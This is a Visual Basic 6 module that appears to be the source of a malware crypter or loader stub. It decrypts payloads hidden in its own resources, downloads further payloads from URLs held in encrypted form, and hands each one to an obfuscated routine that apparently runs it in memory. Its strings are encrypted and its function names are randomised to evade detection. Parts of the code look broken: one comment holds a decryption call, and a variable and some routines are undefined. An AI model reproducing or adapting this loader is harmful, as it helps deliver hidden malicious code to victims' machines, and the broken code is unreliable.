              Attribute VB_Name = "mMain"
Private Declare Function FindResource Lib "KERNEL32" Alias "FindResourceA" (ByVal hInstance As Long, ByVal lpName As String, ByVal lpType As String) As Long
Private Declare Function LoadResource Lib "KERNEL32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function LockResource Lib "KERNEL32" (ByVal hResData As Long) As Long
Private Declare Function SizeofResource Lib "KERNEL32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function FreeResource Lib "KERNEL32" (ByVal hResData As Long) As Long
Private Declare Function GetModuleHandle Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Private Declare Sub CopyMemory Lib "KERNEL32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Const INTERNET_OPEN_TYPE_DIRECT = 1
Private Const INTERNET_OPEN_TYPE_PROXY = 3
Private Const INTERNET_FLAG_RELOAD = &H80000000
Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetCloseHandle Lib "wininet" (ByVal hInet As Long) As Integer
Private Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, sBuffer As Any, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszURL As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Dim b1() As Byte

'''''''''''''''



''''''''''''''''''''
Private Sub Main()
Dim hMod As Long, hRes As Long, hLoad As Long, hLock As Long, lSize As Long, sBuff As String, c As New Class4, sFile() As String, i As Integer

''''''''''''''''


''''''''''''''''''
hMod = GetModuleHandle(vbNullString) 'get the handle of the file

hRes = FindResource(hMod, 500, StringDecrypt(Hex2Str("BB13094D38"), "AxxXzSoSHunvX")) 'find the resource we have added under CUSTOM 101.
hLoad = LoadResource(hMod, hRes) 'load the resource we have just searched
hLock = LockResource(hLoad) 'I dont exactly know what lockresource does: MSDN says StringDecrypt(Hex2Str("C24F5D157322766A6722717267616B646B6766227067716D77706167226B6C226F676F6D707B2C"), "AxxXzSoSHunvX") So I think it just remembers the resource ? xD
lSize = SizeofResource(hMod, hRes) 'check what the filesize of the loaded resource is

sBuff = Space(lSize)

Call CopyMemory(ByVal sBuff, ByVal hLock, lSize) 'this is where it all happens: hLock (the resource loaded in the memory) gets copied to the sBuff string

Call FreeResource(hLoad) 'unload the resource

sBuff = c.DecryptString(sBuff, StringDecrypt(Hex2Str("FE414D0D776D70666A677067"), "AxxXzSoSHunvX"), False)

sFile = Split(sBuff, "()/&@\][")

For i = 0 To UBound(sFile())
If Left(sFile(i), 4) <> StringDecrypt(Hex2Str("E6544A0E"), "AxxXzSoSHunvX") Then
    Call DHFUSADifnui9asof(ThisExe, StrConv(sFile(i), vbFromUnicode))
    Else
    b1 = DownloadFileToMemory(sFile(i))
    Call DHFUSADifnui9asof(ThisExe, b1)
End If
Next i
End Sub

''''''''''''''''''''''


'''''''''''''''''''''''
Public Function D2V1CK44J7DRI3U(CodeKey As String, DataIn As String) As String
    
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    

    For lonDataPtr = 1 To (Len(DataIn) / 2)
        'The first value to be XOr-ed comes from the data to be encrypted
        intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
        'The second value comes from the code key
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        
        strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
   D2V1CK44J7DRI3U = strDataOut
End Function
Private Function DownloadFileToMemory(lpszURL As String) As Byte()
Dim b1() As Byte, b2(0 To 999) As Byte
Dim hOpen As Long
Dim hFile As Long
Dim sBuffer As String
Dim lpRet As Long, lpTotalRead As Long, lpCurrent As Long
    sBuffer = Space(1000)
    hOpen = InternetOpen(StringDecrypt(Hex2Str("E3447A324D676F477A"), "AxxXzSoSHunvX"), INTERNET_OPEN_TYPE_DIRECT, vbNullString, vbNullString, 0)
    hFile = InternetOpenUrl(hOpen, lpszURL, vbNullString, ByVal 0&, INTERNET_FLAG_RELOAD, ByVal 0&)
    lpRet = 1
    lpTotalRead = 1
    Do
        lpCurrent = lpTotalRead - 1
        InternetReadFile hFile, b2(0), 1000, lpRet
        If lpRet = 0 Then Exit Do
        lpTotalRead = lpTotalRead + lpRet
        ReDim Preserve b1(0 To lpTotalRead - 1) As Byte
        CopyMemory b1(lpCurrent), b2(0), lpRet
    DoEvents
    Loop
    InternetCloseHandle hFile
    InternetCloseHandle hOpen
    DownloadFileToMemory = b1
End Function

Public Function StringDecrypt(ByVal Data As String, ByVal Password As String) As String
On error Resume next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
Y = (Y + F(Y) + 1) Mod 256
Key(X) = Key(X) Xor F(temp + F((Y + F(Y)) Mod 254))
Next X
StringDecrypt = StrConv(Key, vbUnicode)
End Function
Public Function Hex2Str(ByVal strData As String)
Dim i As Long, CryptString As String, tmpChar As String
On Local Error Resume Next
For i = 1 To Len(strData) Step 2
CryptString = CryptString & Chr$(Val("&H" & Mid$(strData, i, 2)))
Next i
Hex2Str = CryptString
End Function
Public Function Str2Hex(ByVal strData As String)
Dim i As Long, CryptString As String, tmpAppend As String
On Local Error Resume Next
For i = 1 To Len(strData)
tmpAppend = Hex$(Asc(Mid$(strData, i, 1)))
If Len(tmpAppend) = 1 Then tmpAppend = Trim$(str$(0)) & tmpAppend
CryptString = CryptString & tmpAppend: DoEvents
Next i
Str2Hex = CryptString
End Function
